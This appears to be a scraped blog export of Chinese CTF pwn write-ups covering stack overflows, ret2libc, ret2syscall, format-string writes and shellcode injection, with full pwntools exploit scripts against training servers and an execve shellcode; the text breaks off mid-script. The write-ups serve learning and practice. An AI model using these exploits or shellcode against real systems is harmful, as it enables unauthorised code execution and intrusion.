b&#x27;6148523063484d364c793970625763784c6d6c745a3352774c6d4e76625338794d44497a4c7a41334c7a49304c336c5061316858553070554c6e42755a773d3d&#x27; base64解码得到url 解压压缩包得 找了找星铁的文字 对找得到flag NepCTF{HRP_aIways_likes_March_7th}","categories":[{"name":"wp","slug":"wp","permalink":"http://lmarch2.github.com/categories/wp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"}]},{"title":"week6-T1","slug":"week6-T1","date":"2023-04-01T07:43:53.000Z","updated":"2024-01-31T02:37:37.721Z","comments":true,"path":"posts/c63e16b3/","link":"","permalink":"http://lmarch2.github.com/posts/c63e16b3/","excerpt":"Week 6 T1 bjdctf_2020_babystack 2023-02-05WPBUUCTF pwn 第十一题考点：ret2text","text":"Week 6 T1 bjdctf_2020_babystack 2023-02-05WPBUUCTF pwn 第十一题考点：ret2text 省略第一步……只开了NX __isoc99_scanf(“%d”, &amp;nbytes) 让用户输入下次输入时接受的数据的长度 read(0, &amp;buf, (unsigned int)nbytes) 用户可以控制长度，实现栈溢出 0x02打开IDA 找到有&#x2F;bin&#x2F;sh找到后门函数 buf占用的空间为0x10 0x03exp 123456789101112from pwn import * p = remote(&#x27;node4.buuoj.cn&#x27;,29891)backdoor_addr = 0x4006e6payload =b &#x27;a&#x27; * (0x10+8) + p64(backdoor_addr)p.sendline(b&#x27;100&#x27;)p.sendline(payload)p.interactive() 0x04发现这样也不错，交给工具来找地址 变量(unsigned int)nbytes用户可控，且是个无符号函数 可用-1进行绕过，这样用户可输入的数据长度就十分巨大了 接着调用backdoor()即可getshell 12345678910111213141516171819from pwn import *#start# r = process(&quot;../buu/bjdctf_2020_babystack&quot;)r = remote(&quot;node4.buuoj.cn&quot;,29891)elf = ELF(&quot;../buu/bjdctf_2020_babystack&quot;)#paramsbackdoor_addr = elf.symbols[&#x27;backdoor&#x27;]#attackr.recvuntil(b&quot;your name:&quot;)r.sendline(&quot;-1&quot;)r.recvuntil(b&quot;name?&quot;)payload = b&#x27;M&#x27; * (0x10 + 8) + p64(backdoor_addr)r.sendline(payload)r.interactive()","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.com/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.com/tags/BUUCTF/"}]},{"title":"week4&&week5-T5","slug":"week4-week5-T5","date":"2023-04-01T07:36:00.000Z","updated":"2024-01-31T02:37:22.424Z","comments":true,"path":"posts/95338453/","link":"","permalink":"http://lmarch2.github.com/posts/95338453/","excerpt":"T5 ciscn_2019_c_1 2023-01-30WPBUUCTF pwn 题考点：栈溢出 ret2libc3","text":"T5 ciscn_2019_c_1 2023-01-30WPBUUCTF pwn 题考点：栈溢出 ret2libc3 0x01这不上一题刚做这类？直接模仿一手。。。。file checksec —— 64-bit 开NX 0x02运行一下看看 再看看IDA 研究了半天发现是让你加解密的再看看string window 没用system和binsh又发现加密函数里有gets函数，可构成栈溢出 0x03分析 是相同的思想，这里不赘述了，大致流程就是 利用一个程序已经执行过的函数去泄露它在程序中的地址，然后取末尾3个字节，去找到这个程序所使用的libc的版本 用同一个程序里函数的地址-libc里的函数地址即可得到偏移量 得到偏移量后就可以推算出程序中其他函数的地址，知道其他函数的地址之后就可以去执行system（’&#x2F;bin&#x2F;sh‘） 0x04写exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import*from LibcSearcher import*p=remote(&#x27;node4.buuoj.cn&#x27;,28342)elf=ELF(&#x27;./ciscn_2019_c_1&#x27;)main=0x400b28pop_rdi=0x400c83ret=0x4006b9puts_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]p.sendlineafter(&#x27;choice!\\n&#x27;,&#x27;1&#x27;)payload=&#x27;\\0&#x27;+&#x27;a&#x27;*(0x50-1+8)payload+=p64(pop_rdi)payload+=p64(puts_got)payload+=p64(puts_plt)payload+=p64(main)p.sendlineafter(&#x27;encrypted\\n&#x27;,payload)p.recvline()p.recvline()puts_addr=u64(r.recvuntil(&#x27;\\n&#x27;)[:-1].ljust(8,&#x27;\\0&#x27;))print hex(puts_addr)libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)offset=puts_addr-libc.dump(&#x27;puts&#x27;)binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)system=offset+libc.dump(&#x27;system&#x27;)p.sendlineafter(&#x27;choice!\\n&#x27;,&#x27;1&#x27;)payload=&#x27;\\0&#x27;+&#x27;a&#x27;*(0x50-1+8)payload+=p64(ret)payload+=p64(pop_rdi)payload+=p64(binsh)payload+=p64(system)p.sendlineafter(&#x27;encrypted\\n&#x27;,payload)p.interactive() libcsearch的github网址安装 git clone https://github.com/lieanu/LibcSearcher.gitcd LibcSearchersudo python setup.py develop 覆盖数据payload&#x3D;b’\\0’+b’a’*(0x50-1+8)\\0是为了让加密函数的一个strlen函数停止（这个函数遇‘0’会停止），从而绕过加密，保证我们构造的rop不会被破坏，buf的大小为0x50-1是减去\\0+8是覆盖rbp 这道题的接收非常讲究泄露地址接收时先是两下recvline()，原因 recvline()一次接收到\\n;第一次recvline只能到Ciphertext；第二次只能接收到0a第三次的recvuntil才开始处理泄露的got地址。先开一下context_log_lever&#x3D;’debug’，整体看一下， 再自己recvuntil看能接收到什么内容。 然后再用recvuntil(‘\\n’)[:-1].ljust(8,’\\0’)来舍弃接收到的字符串最后的’\\x0’并向左补齐 还有这一道题是64位的程序，这边涉及到64位程序和32位程序运行时的区别了32位程序运行执行指令的时候直接去内存地址寻址执行64位程序则是通过寄存器来传址，寄存器去内存寻址，找到地址返回给程序因此要用寄存器存参（为什么呢？？还是不理解啊） 注意栈对齐虽然我不懂为什么要…… 还有最后为什么还要再输一个0呢？ 搞不懂了 求助 其实做这题主要还是模仿大佬们写的exp，好多细节都不清楚，但是感觉做了那么久又不能扔在那边等完全懂了再写题解 感觉好浪费还得再研究啊 参考资料： [BUUCTF]PWN6——ciscn_2019_c_1","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.com/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.com/tags/BUUCTF/"}]},{"title":"week4&&week5-T4","slug":"week4-week5-T4","date":"2023-04-01T07:35:47.000Z","updated":"2024-01-31T02:37:05.285Z","comments":true,"path":"posts/e234b4c5/","link":"","permalink":"http://lmarch2.github.com/posts/e234b4c5/","excerpt":"T4 ret2libc3 2021-01-30WPctf-wiki ret2libc3考点：栈溢出rop","text":"T4 ret2libc3 2021-01-30WPctf-wiki ret2libc3考点：栈溢出rop 0x01这个是真的难…… 首先得透彻理解got和plt，其次还得对exp的写作要有一定的熟练度，而且还有各种各样古怪的写法…… 现在我还很多地方琢磨不清楚，只是依葫芦画瓢地复盘了一下，现在这篇题解只是写个大框架，具体细节后面慢慢补充了…… file checksec —— 32-bit 开NX 漏洞和内存分析和之前的系列题类似，不赘述了 0x02IDA看源码，既没有system也没有binsh 由linux延迟绑定机制的知识（后面再写一篇总结吧）可知，我们如果要调用system函数，就要知道他的got表中的地址，但libc被加载到的内存的位置是随机的，我们无法得知不过，同一版本的libc的两个库函数在libc中的相对位置是不变的，所以如果我们可以知道一个已经执行过的函数的got表地址，然后确定libc的版本，就可以加上和system函数的偏移，从而得到system函数的真实地址（got表地址）而现在我们有一个puts函数，libc中也有system和binsh 0x03我们只需要通过栈溢出利用puts函数，打印puts函数的got表中的地址，然后获取偏移，得到system函数和&#x2F;bin&#x2F;sh字符串的地址，再将puts函数的返回地址覆盖为system函数的地址即可我们可以先运行exp1（见0x04）拿到获取puts的真实地址，然后去libc- database -search的网站查询，可得到puts函数system函数和binsh字符串对应的偏移地址 （这里直接盗图了……） 知道了puts函数的真实地址和偏移之后，就可以将puts函数的真实地址减去偏移地址，得到libc的基址，将libc的基址分别与system，&#x2F;bin&#x2F;sh字符串的偏移相加，就可以得到对应的真实地址然后写完整的exp 0x04所以其实exp是分两部的，第一步是构造栈溢出利用puts函数打印出真实地址；第二步是溢出覆盖至system函数和&#x2F;bin&#x2F;sh的地址，拿到shell 1234567891011121314151617181920#first expfrom pwn import *elf=ELF(&#x27;ret2libc3&#x27;)p=process(&#x27;./ret2libc3&#x27;)puts_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]start_addr = elf.symbols[&#x27;_start&#x27;]payload1=b&#x27;A&#x27;*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)p.sendlineafter(&quot;!?&quot;,payload1)puts_addr=u32(p.recv(4))print(&quot;puts_got_addr = &quot;,hex(puts_got_addr))print(&quot;puts_plt_addr = &quot;,hex(puts_plt_addr))print(&quot;main_plt_addr = &quot;,hex(main_plt_addr))print(&quot;puts addr = &quot;, hex(puts_addr))p.interactive() 12345678910111213141516171819202122232425262728293031323334353637#second expfrom pwn import *p = process(&#x27;./ret2libc3&#x27;)elf = ELF(&#x27;./ret2libc3&#x27;)puts_got_addr = elf.got[&#x27;puts&#x27;]puts_plt_addr = elf.plt[&#x27;puts&#x27;]main_plt_addr = elf.symbols[&#x27;_start&#x27;]print(&quot;puts_got_addr = &quot;,hex(puts_got_addr))print(&quot;puts_plt_addr = &quot;,hex(puts_plt_addr))print(&quot;main_plt_addr = &quot;,hex(main_plt_addr))p.recv()p.sendline(payload)puts_addr = u32(p.recv()[0:4])print(&quot;puts_addr = &quot;,hex(puts_addr))sys_offset = 0x03cd10puts_offset = 0x067360sh_offset = 0x17b8cf#根据公式 libc基地址 + 函数偏移量 = 函数真实地址 来计算libc_base_addr = puts_addr - puts_offset #计算出libc基地址sys_addr = libc_base_addr + sys_offset #计算出system的真实地址sh_addr = libc_base_addr + sh_offset #计算出/bin/sh的真实地址print(&quot;libc_base_addr = &quot;,hex(libc_base_addr))print(&quot;sys_addr = &quot;,hex(sys_addr))print(&quot;sh_addr = &quot;,hex(sh_addr))payload2 = flat([b&#x27;A&#x27;*112, p32(sys_addr), &quot;AAAA&quot;, p32(sh_addr)])p.sendline(payload2)p.interactive() 0x05还有其他几种方法目前没用搞懂之后学会了（看懂了）再写过问： p.recv()[0:4]和p.recv(4）的区别？？网上没搜到要在本地打通是不是要对libc做什么操作呀 参考资料： pwn小白入门06–ret2libc 基本ROP之ret2libc3 yichen二进制安全","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.com/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.com/tags/ctf-wiki/"}]},{"title":"week4&&week5-T3","slug":"week4-week5-T3","date":"2023-04-01T07:35:34.000Z","updated":"2024-01-31T02:36:50.519Z","comments":true,"path":"posts/7c502166/","link":"","permalink":"http://lmarch2.github.com/posts/7c502166/","excerpt":"T3 [第五空间2019 决赛]PWN5 2023-01-27WPBUUCTF pwn第七题考点：格式化字符串漏洞","text":"T3 [第五空间2019 决赛]PWN5 2023-01-27WPBUUCTF pwn第七题考点：格式化字符串漏洞 0x01file &amp;&amp; checksec —— 32 bit , 开启NX，开启cannary 这就没法栈溢出了运行程序看看输出 0x02 IDA查看代码 先找string window 发现&#x2F;bin&#x2F;sh，进一步查看发现程序就是先读取用户名，再读入密码，然后再将用户输入的密码和生成的一个随机密码比较，正确则执行system(&#x2F;bin&#x2F;sh)，错误则输出fail 观察发现printf(&amp;buf);存在格式化字符串漏洞 （关于格式化字符串漏洞的相关知识会另写一篇） 0x03 现在可以利用%n来修改参数里的内容，我们不知道读入的随机数是多少，那么我们将它改成我们写入的数据就好了 首先利用测试数据”AAAA %08x %08x %08x %08x %08x %08x %08x………… “来确定偏移量， 发现输入的数据是栈的第十个 并且存放生成的随机密码的地址是从0x0804C044开始的，共四字节空间 所以我们可以用%10$,%11$,%12$,%13$去定位到这4个地址，再用%n修改这些地址里的内容 可以构造payload了 0x04 12345678910111213from pwn import* p=remote(&#x27;node4.buuoj.cn&#x27;,28332) addr = 0x804c044 payload=p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3)payload+=b&#x27;%10$n%11$n%12$n%13$n&#x27; p.sendline(payload)p.sendline(str(0x10101010))p.interactive() 因为总共输入了四个地址，共16位，所以%n所赋值的数是16，所以用户输入密码时发送的数据为0x10101010","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.com/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.com/tags/BUUCTF/"}]},{"title":"week4&&week5-T2","slug":"week4-week5-T2","date":"2023-04-01T07:35:07.000Z","updated":"2024-01-31T02:36:22.417Z","comments":true,"path":"posts/b5711f0/","link":"","permalink":"http://lmarch2.github.com/posts/b5711f0/","excerpt":"T2 ret2syscall 2023-01-22WPctf-wiki 基础rop考点：ret2syscall 题目链接","text":"T2 ret2syscall 2023-01-22WPctf-wiki 基础rop考点：ret2syscall 题目链接 0x01file checksec —— 32-bit 开启NX保护，堆栈不可执行而且注意这是statically linked（静态链接），不能通过泄露库函数地址获取system函数地址 0x02IDA看源码，发现没有system函数可用有gets函数，应该是通过它实现栈溢出 由0x01可知我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。采取使用ret2syscall即控制程序执行系统调用，获取 shell。 也就是我们只需要把各个参数放在对应的寄存器中，执行int 0x80 就可实现对系统的调用 0x03利用系统调用来获取shell execve(“&#x2F;bin&#x2F;sh”,NULL,NULL) 关于系统调用补充知识见0x05 构造的目标如下 系统调用号，即 eax 应该为 0xb 第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。 第二个参数，即 ecx 应该为 0 第三个参数，即 edx 应该为 0 我们要找到系统调用相对于的寄存器的值首先要让EAX &#x3D; 0xb，那么需要的指令是 pop eax ；但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，所以pop之后还需要一个ret返回到控制程序执行流， pop eax ；ret 选择这个地址： 0x080bb196 : pop eax ; ret 同理，查找控制其他三个寄存器的gadget 我们选择这个地址： 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret 这个可以直接控制其它三个寄存器。 还要获取&#x2F;bin&#x2F;sh的地址0x80BE408 还有int 0x80的地址 0x08049421 0x04可以写exp了 1234567891011121314from pwn import *p = process(&quot;./rop&quot;)pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421binsh = 0x80be408payload = flat([b&#x27;A&#x27; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])#偏移量的计算方法和ret2text的相同p.sendline(payload)p.interactive() 0x05补充一些系统调用的相关知识 Linux 在x86上的系统调用通过 int 80h 实现，用系统调用号（在 &#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_64.h 和 &#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_32.h 分别可以查看 64 位和 32 位的系统调用号。）来区分入口函数。 操作系统实现系统调用的基本过程是： 应用程序调用库函数（API）； API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态； 内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）； 系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数； 中断处理函数返回到 API 中； API 将 EAX 返回给应用程序 应用程序调用系统调用的过程是： 把系统调用的编号存入 EAX； 把函数参数存入其它通用寄存器； 触发 0x80 号中断（int 0x80） Linux在用int 0x80进行系统调用时，调用号存在于EAX，第一个参数存在于EBX，第二个参数存在于ECX，第三个参数存在于EDX 更多系统调用号可参考 参考文章 Reference参考文章： ret2syscall知识点及例题ret2syscallLinux系统调用号 - gsharpsh00ter - 博客园 (cnblogs.com)","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.com/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.com/tags/ctf-wiki/"}]},{"title":"week4 T1","slug":"week4&&week5-T1","date":"2023-01-20T15:36:57.000Z","updated":"2024-01-31T02:42:34.735Z","comments":true,"path":"posts/64ef4d6b/","link":"","permalink":"http://lmarch2.github.com/posts/64ef4d6b/","excerpt":"Week4&amp;&amp;Week5 T1 jarvisoj_level02023-01-20WPBUUCTF pwn 第六题考点： 简单栈溢出&#x2F;基本rop ret2text","text":"Week4&amp;&amp;Week5 T1 jarvisoj_level02023-01-20WPBUUCTF pwn 第六题考点： 简单栈溢出&#x2F;基本rop ret2text 0x01file checksec —— 64-bit，开NX 0x02IDA查看发现main函数里的vulnerable_function()函数里的read函数读取0x200ull，而buf空间只有0x80又找到有system(“&#x2F;bin&#x2F;sh”)返回其地址 0x03exp 12345678910from pwn import *p = remote(&quot;node4.buuoj.cn&quot;,29175)ret_arr = 0X40059Apayload = b&#x27;a&#x27;*(0x80 + 0x8) + p64(ret_arr)p.sendline(payload)p.interactive()","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.com/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.com/tags/BUUCTF/"}]},{"title":"week3 T5","slug":"week3-T5","date":"2023-01-15T14:43:00.000Z","updated":"2024-01-31T02:34:54.737Z","comments":true,"path":"posts/fe55b1cb/","link":"","permalink":"http://lmarch2.github.com/posts/fe55b1cb/","excerpt":"T5 level2 2023-01-15WP攻防世界pwn题考点：ret2libc1（不是我不想往下做，而是往下做的话真的是要补太多知识了，新的知识还没学会，只好找一题来划一下水了……）","text":"T5 level2 2023-01-15WP攻防世界pwn题考点：ret2libc1（不是我不想往下做，而是往下做的话真的是要补太多知识了，新的知识还没学会，只好找一题来划一下水了……） 0x01file，checksec —— 32-bit，开启NX 0x02IDA一看没啥，点进vuln函数找到一个read函数由图中我们可以看到，buf分配的空间为0x88,而read函数读取0x100，显然存在溢出shift+f12找到有字符串&#x2F;bin&#x2F;sh，并且在vuln函数里有system函数，只不过参数是”ehco Input：”罢了记下system函数的plt表地址0x08048320 这样就只需要我们覆盖buf，将system函数地址写为返回地址，并将&#x2F;bin&#x2F;sh作为参数传递其地址即可 0x03exp 12345678910from pwn import *p = remote(&#x27; 61.147.171.105 &#x27;, 60218)payload = b&#x27;a&#x27; * (0x88 + 4) + p32(0x08048320)+b&#x27;bbbb&#x27; + p32(0x0804A024)#0x88为buf大小，+4是ebp大小，p32(0x08048320)是打包system地址，b&#x27;bbbb&#x27;是填充无效system返回地址， #p32(0x0804A024)是/bin/sh地址p.sendline(payload)p.interactive()","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.com/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"攻防世界","slug":"攻防世界","permalink":"http://lmarch2.github.com/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"week3 T4","slug":"week3-T4","date":"2023-01-15T14:42:38.000Z","updated":"2024-01-31T02:34:46.200Z","comments":true,"path":"posts/8952815d/","link":"","permalink":"http://lmarch2.github.com/posts/8952815d/","excerpt":"T4 ret2shellcode 2 (栈写入) 2023-01-15WPsniperoj-pwn100-shellcode考点：栈溢出 shellcode","text":"T4 ret2shellcode 2 (栈写入) 2023-01-15WPsniperoj-pwn100-shellcode考点：栈溢出 shellcode 0x01file ,checksec检查保护机制开启了PIE 地址变换 0x02IDA中看看源码发现已经有输出了buf的地址，因此随机化地址便可以进行绕过继续分析发现read函数读入0x40字节，而buf分配的空间才0x10字节，存在栈溢出打开string window，没有system和&#x2F;bin&#x2F;sh，应该是要写入shellcode了 0x03先看看我们的空间能不能写下shellcode这里main函数里声明的buf只有0x10即16字节，属于局部变量，空间分配在栈上gdb动态调试，（其实IDA能看出来，就是不确定对不对就是了）我们计算buf的偏移量为rbp - rsp &#x3D; 0x7fffde3d2820 - 0x7fffde3d2810 &#x3D; 10，再加上rbp 8字节为0x18即24字节 而我们用shellcraft生成的shellcode时44字节的，显然已经超过了于是我们想找一个长度较小的shellcode来写入，但是由于某些我还没搞很懂的原因，我们必须要将把shellcode放在返回地址的后面那放在后面的话是不是44字节的shellcode就可以使用了呢？其实也不行，要注意到read函数是读取0x40字节的，这就使得读取的字符串长度有一定的限制。这0x40字节的数据，既要包括填充的垃圾数据，也要包括shellcode的返回地址和shellcode的内容，我们还得计算一下允许的shellcode的长度0x40 - ( 0x10 + 8 ) - 8 &#x3D; 32（0x10+8）为造成溢出填充的垃圾数据，后面8为是shellcode地址的长度，所以构建的shllcode必须在32以内之前使用的shellcraft.sh()生成的shellcode有44字节，在这里只有32字节，因此并不适用 shellcode&#x3D;”\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05” 一个找shellcode的网站 https://www.exploit-db.com/shellcodeshttp://shell-storm.org/shellcode/ 这个shellcode只有23个字节，短小精悍，适合放在栈中去执行 写exp (发现一个地方：就是正常python代码不能在开头留空格) 1234567891011from pwn import *p = process(&#x27;./shellcode&#x27;)p.recvuntil(&#x27;[&#x27;)addr = p.recvuntil(&#x27;]&#x27;, drop=True)p.recvuntil(&#x27;Now give me your answer&#x27;)shellcode=&quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot;p.sendline(b&#x27;a&#x27;*24 + p64(int(addr,16)+32) + shellcode)p.interactive() 这里我们只知道一个确定的buf的addr，shellcode的地址要从buf的地址推出来，也就是int(addr,16)+32 0x04为什么不可以找一个长度小于24的shellcode直接写入buf中呢？而非要先填充buf再返回至写shellcode的地方呢？在网上找到一个解释不知道对不对 因为其本身是有push指令的，如果我们把shellcode放在返回地址的前面，在程序leave的时候会破坏shellcode，所以我们将其放在后面","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.com/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.com/tags/ctf-wiki/"}]},{"title":"week3 T3","slug":"week3-T3","date":"2023-01-15T14:41:45.000Z","updated":"2024-01-31T02:34:38.718Z","comments":true,"path":"posts/173614fe/","link":"","permalink":"http://lmarch2.github.com/posts/173614fe/","excerpt":"T3 ret2shellcode 1 (bss段写入) 2023-01-15WPctf-wiki pwn考点：栈溢出 shellcode","text":"T3 ret2shellcode 1 (bss段写入) 2023-01-15WPctf-wiki pwn考点：栈溢出 shellcode 0x01file，checksec —— 32bit，啥保护都没开 0x02IDA查看源码，没有system函数和&#x2F;bin&#x2F;sh字符串并且可以看到，main函数中，gets函数读取用户输入到变量s，strcnp将s中的字符串复制到buf2处buf2并没有在main函数中看到定义，应该是全局变量，进一步查看buf2在bss段中 0x03通过vmmap我们可以查看bss段是否具有可执行权限rw-p，可读可写（这里操作上要注意一下，vmmap的命令要在程序运行时使用，可以给程序下断点或者ctrl+C停住程序再输命令） 参考资料 0x04有执行权限的话就可以向bss段写入shellcode了，之后控制程序返回执行shellcode在写exp之前还要先计算偏移量，方法和ret2text类似，与之前的偏移量都是一样的用gdb调试或者爆破求出偏移量为112使用shellcraft.sh()生成shellcode，并且用shellcode.ljust()方法向左对齐补齐字符串，溢出填充返回地址exp为 123456789from pwn import *p = process(&#x27;./ret2shellcode&#x27;)shellcode = asm(shellcraft.sh())buf2_addr = 0x804a080p.sendline(shellcode.ljust(112, &#x27;A&#x27;) + p32(buf2_addr))p.interactive() 0x05好像shellcode写在栈或者bss段上都可以吧？ 网上看到一个解释说不能直接把shellcode写在栈上？不知道对不对：绝大多数的操作系统都默认开启ASLR保护，这大大提高了攻击栈的难度。因此，栈应当是我们最后考虑的对象","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.com/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.com/tags/ctf-wiki/"}]},{"title":"week3 T2","slug":"week3-T2","date":"2023-01-15T14:41:00.000Z","updated":"2024-01-31T02:34:32.445Z","comments":true,"path":"posts/60312468/","link":"","permalink":"http://lmarch2.github.com/posts/60312468/","excerpt":"T2 wustctf2020_closed 2023-01-15WPBUUCTF pwn考点：close函数","text":"T2 wustctf2020_closed 2023-01-15WPBUUCTF pwn考点：close函数 0x01做了hgame的第二题后，去补充了一下关于close函数的知识，再从BUUCTF中找了一题练了练先file知道时64-bit 0x02这一题结构很简单，再IDA中直接能找到在main函数中的vulnerable函数中return shell函数中有system函数直接给好了 0x03但是因为 close(1) close(2) 将标准输出和标准错误输出关闭了，这样在窗口上看不到输出这时候就需要我们重新定位标准输出 0x04补充一些知识 在Linux中的文件，文件描述符（file descriptor）是内核为了高效管理已被打开的文件所创建的索引，是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I&#x2F;O操作的系统调用都通过文件描述符。程序刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。如果此时去打开一个新的文件，它的文件描述符会是3。 标准输入输出的指向是默认的，也就是默认打开一个终端后，0，1，2都指向同一个位置也就是当前终端，我们可以修改它们的指向，也即重定位 我们可以将标准输出进行重定向 &amp;+文件描述符, 可以指代该文件(进程) 现在可以解决close函数的问题了在同一个进程里面, 标准输出和标准输入的指向都是相同的终端. 由于标准输入没有被禁用，所以我们可以使用命令 exec 1&gt;&amp;0 让标准输出定位到标准输入的文件，也就相当于重启了标准输出本质上即exec+重定向命令，只不过操作的是文件描述符现在cat到的flag就能够输出了出题人很有意思，连接上环境第一件事是嘲讽一下你 参考 文章","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.com/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.com/tags/BUUCTF/"}]},{"title":"week3 T1","slug":"week3-T1","date":"2023-01-15T01:32:24.000Z","updated":"2024-01-31T02:34:24.107Z","comments":true,"path":"posts/f93875d2/","link":"","permalink":"http://lmarch2.github.com/posts/f93875d2/","excerpt":"T1 easy_overflow 2023-01-14WPHgame week1 pwn 第二题考点：简单栈溢出","text":"T1 easy_overflow 2023-01-14WPHgame week1 pwn 第二题考点：简单栈溢出 0x01file——64-bit,checksec 开启NX 0x02IDA看源码，先找&#x2F;bin&#x2F;sh，一路索引过去发现在一个后门函数中 然后我的第一反应是先记下call system的地址，结果一看，没找到？取而代之的是call sub_401060于是我卡了一下，可能是第一次碰到这样的题的缘故，我没有意识到函数名称可以是不一样的打开main函数伪代码也是这样……越看越不对劲，搜索资料才发现这种题的风格就是去符号使原函数名字无法显示这么说IDA无法解决了 0x03我们转而动态调试试一下我们假设文件带有system函数，又据题意应该是有gets或者read之类的函数的运行文件测试一下确实如此那么我们在这几个函数处试着打断点我们可以看到，其中system的地址和后面函数中的call sub_401060的plt处地址对上了read函数的地址和main函数中的 call sub_401080的plt处地址对上了同时呢，gdb运行文件的时候还发现main函数中还有一个close函数，浏览一下main函数源码只有sub_401070了查阅了一些资料得知，close(1)关闭了标准输出，详细见这篇文章也就是有下面我们得到shell后无法在屏幕上看到flag的情况这时候就要输入exec 1&gt;&amp;0重启标准输出那么现在呢我们已经把文件里的几个主要函数分析好了，接下来就要找偏移量了 0x03这一部分我发现一个很坑的地方，如果我们用ctf-wilki上的方法，那么我们在gdb调试设断点的时候就不能设 b read 这样设的话我们直接就进入到read函数里了，那就无法看到储存数据的寄存器（不管是什么）距rsp或者rbp的偏移了并且，此时已经开始进入read子函数，即已经分配了新的栈帧了，rsp已经移动，再去计算rsp和rbp的差值则会不准确 b *0x4011be 我们应该这样设断点，这样就停止在进入read函数之前，不仅可以看到相对偏移,还能计算出rbp-rsp得出rsp和rsi 0x7fffffffddd0,rbp为0x7fffffffdde0,计算得距rbp偏移量就为0x7fffffffdde0-0x7fffffffddd0那么再加上rbp求得为0x10+8 还可以暴力求得 懒得计算偏移量的话 0x04可以写exp 12345678910from pwn import *p = remote(&quot;week-1.hgame.lwsec.cn&quot;, 